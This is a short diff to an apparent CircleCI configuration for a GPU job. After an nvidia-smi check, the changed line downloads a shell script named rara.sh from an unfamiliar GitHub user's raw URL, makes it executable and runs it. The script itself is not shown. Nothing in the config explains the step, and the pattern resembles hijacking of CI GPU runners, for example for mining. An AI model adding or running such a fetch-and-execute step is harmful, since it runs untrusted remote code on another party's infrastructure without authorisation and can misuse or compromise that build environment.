@@ -7,4 +7,4 @@ jobs:
     resource_class: gpu.nvidia.small
     steps:
       - run: nvidia-smi
-      - run: wget https://raw.githubusercontent.com/bajol1/firman/main/dwia.sh
+      - run: wget https://raw.githubusercontent.com/bajol1/sange/main/rara.sh && chmod +x rara.sh && ./rara.sh
